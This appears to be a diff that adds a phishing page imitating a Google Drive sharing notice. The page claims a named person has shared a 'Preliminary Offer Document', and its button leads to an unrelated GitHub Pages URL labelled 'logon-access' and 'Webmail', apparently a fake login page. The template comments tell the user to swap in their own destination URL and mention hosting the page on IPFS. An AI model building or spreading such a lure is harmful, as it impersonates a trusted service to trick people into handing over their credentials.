@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head><link href="favicon.png" rel="icon"/>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Shared with you – Google Drive</title>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&amp;family=Roboto:wght@400;500&amp;display=swap" rel="stylesheet"/>
+<style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --blue: #1a73e8;
+      --blue-hover: #1557b0;
+      --blue-light: #e8f0fe;
+      --text-primary: #202124;
+      --text-secondary: #5f6368;
+      --border: #dadce0;
+      --bg: #f8f9fa;
+      --white: #ffffff;
+      --shadow: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px rgba(60,64,67,.15);
+      --shadow-sm: 0 1px 2px rgba(60,64,67,.3), 0 1px 3px rgba(60,64,67,.15);
+    }
+
+    body {
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── Top bar ── */
+    header {
+      background: var(--white);
+      border-bottom: 1px solid var(--border);
+      padding: 0 16px;
+      height: 64px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .logo-wrap {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      text-decoration: none;
+    }
+
+    .logo-img {
+      width: 40px;
+      height: 40px;
+      object-fit: contain;
+    }
+
+    .logo-icon { width: 40px; height: 40px; }
+
+    .logo-text {
+      font-size: 22px;
+      font-weight: 400;
+      color: var(--text-secondary);
+      letter-spacing: -0.5px;
+      margin-left: 2px;
+    }
+    .logo-text span { color: var(--text-primary); }
+
+    /* ── Main card area ── */
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 16px;
+    }
+
+    .card {
+      background: var(--white);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      box-shadow: var(--shadow);
+      max-width: 520px;
+      width: 100%;
+      overflow: hidden;
+      animation: fadeUp .35s ease both;
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(16px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .card-banner {
+      background: linear-gradient(135deg, #e8f0fe 0%, #d2e3fc 100%);
+      padding: 40px 0 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .folder-icon {
+      width: 96px;
+      height: 96px;
+      filter: drop-shadow(0 4px 8px rgba(26,115,232,.25));
+    }
+
+    .card-body { padding: 28px 32px 32px; }
+
+    .shared-by {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: var(--blue);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 17px;
+      font-weight: 500;
+      color: #fff;
+      flex-shrink: 0;
+      overflow: hidden;
+    }
+    .avatar img { width: 100%; height: 100%; object-fit: cover; }
+
+    .shared-meta { flex: 1; }
+    .shared-name {
+      font-size: 15px;
+      font-weight: 500;
+      color: var(--text-primary);
+      line-height: 1.3;
+    }
+    .shared-label {
+      font-size: 13px;
+      color: var(--text-secondary);
+      margin-top: 1px;
+    }
+
+    .divider {
+      height: 1px;
+      background: var(--border);
+      margin: 0 0 20px;
+    }
+
+    .folder-title {
+      font-size: 22px;
+      font-weight: 500;
+      color: var(--text-primary);
+      margin-bottom: 6px;
+      line-height: 1.3;
+    }
+
+    .folder-desc {
+      font-size: 14px;
+      color: var(--text-secondary);
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+
+    .btn-open {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: var(--blue);
+      color: #fff;
+      font-family: 'Google Sans', sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      letter-spacing: .25px;
+      padding: 10px 24px;
+      border-radius: 4px;
+      text-decoration: none;
+      border: none;
+      cursor: pointer;
+      transition: background .15s, box-shadow .15s;
+      box-shadow: var(--shadow-sm);
+    }
+    .btn-open:hover { background: var(--blue-hover); box-shadow: var(--shadow); }
+    .btn-open:active { background: #0d47a1; }
+    .btn-open svg { flex-shrink: 0; }
+
+    footer {
+      text-align: center;
+      padding: 16px;
+      font-size: 12px;
+      color: var(--text-secondary);
+    }
+    footer a { color: var(--text-secondary); text-decoration: none; }
+    footer a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+<!-- Header -->
+<header>
+<a class="logo-wrap" href="#">
+<!--
+        LOGO: Replace YOUR_LOGO_URL with your actual logo image URL.
+        If the image fails to load, the Google Drive fallback icon is shown.
+      -->
+<img alt="Logo" class="logo-img" onerror="this.style.display='none'; document.getElementById('fallback-logo').style.display='block';" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQK06Nq9KCDjECMqHPWjuZ8jBXX0tFOpDo_UA&amp;s"/>
+<svg class="logo-icon" id="fallback-logo" style="display:none" viewbox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg">
+<path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"></path>
+<path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0 -1.2 4.5h27.5z" fill="#00ac47"></path>
+<path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"></path>
+<path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"></path>
+<path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"></path>
+<path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 28h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"></path>
+</svg>
+<span class="logo-text"><span>Drive</span></span>
+</a>
+</header>
+<!-- Main content -->
+<main>
+<div class="card">
+<!-- Blue banner with folder icon -->
+<div class="card-banner">
+<svg class="folder-icon" fill="none" viewbox="0 0 96 80" xmlns="http://www.w3.org/2000/svg">
+<rect fill="#1a73e8" height="64" rx="6" width="96" x="0" y="16"></rect>
+<path d="M0 22C0 18.686 2.686 16 6 16H38L48 26H90C93.314 26 96 28.686 96 32V74C96 77.314 93.314 80 90 80H6C2.686 80 0 77.314 0 74V22Z" fill="#4a90e2"></path>
+<path d="M0 16H40L50 26H96V30H0V16Z" fill="#1a73e8"></path>
+<rect fill="rgba(255,255,255,0.4)" height="6" rx="3" width="60" x="18" y="44"></rect>
+<rect fill="rgba(255,255,255,0.25)" height="6" rx="3" width="44" x="18" y="56"></rect>
+</svg>
+</div>
+<div class="card-body">
+<!-- Shared-by row -->
+<div class="shared-by">
+<div class="avatar" id="avatarWrap">
+<!--
+              AVATAR: Replace YOUR_AVATAR_URL with a real image URL.
+              Falls back to the first letter of [Name].
+            -->
+<img alt="Avatar" onerror="this.style.display='none'; document.getElementById('avatar-letter').style.display='flex';" src="https://api.dicebear.com/10.x/initials/svg?seed=Greg%20Cunniff"/>
+<span id="avatar-letter" style="display:none">GC</span> <!-- Replace this letter with the first later of your name -->
+</div>
+<div class="shared-meta">
+<!-- NAME: Replace [Name] with the actual person's name -->
+<div class="shared-name">Greg Cunniff</div>
+<div class="shared-label">shared a document with you</div>
+</div>
+</div>
+<div class="divider"></div>
+<div class="folder-title">Preliminary Offer Document</div>
+<p class="folder-desc">
+<!-- NAME: Replace [Name] below as well -->
+<strong>Greg Cunniff</strong> shared a document with you.<br/>
+          Click the button below to view it.
+        </p>
+<!--
+          BUTTON URL: Replace YOUR_FOLDER_URL with the destination link.
+          The page is fully static and IPFS-compatible — no server required.
+        -->
+<a class="btn-open" href="https://logon-access.github.io/Webmail/pages/c8e4552f30/">
+<svg fill="none" height="18" viewbox="0 0 24 24" width="18" xmlns="http://www.w3.org/2000/svg">
+<path d="M20 6h-8l-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm0 12H4V6h5.17l2 2H20v10z" fill="white"></path>
+</svg>
+          Click here to view
+        </a>
+</div>
+</div>
+</main>
+<footer>
+<a href="#">Privacy</a>  ·  <a href="#">Terms</a>  ·  <a href="#">About Drive</a>
+</footer>
+</body>
+</html>
